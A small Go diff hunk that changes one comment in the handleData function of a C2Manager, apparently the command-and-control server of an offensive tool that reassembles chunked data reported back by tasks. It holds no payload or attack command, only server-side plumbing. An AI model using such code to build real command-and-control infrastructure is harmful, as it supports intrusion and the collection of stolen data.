@@ -1356,7 +1356,7 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	chunkIndex, _ := strconv.Atoi(parts[3])
 	data := parts[4]
 
-	// Check if we're expecting this data (or if task exists)
+	// Get totalChunks from expectation (set by META message)
 	c2.mutex.RLock()
 	expected, hasExpectation := c2.expectedResults[taskID]
 	task, taskExists := c2.tasks[taskID]
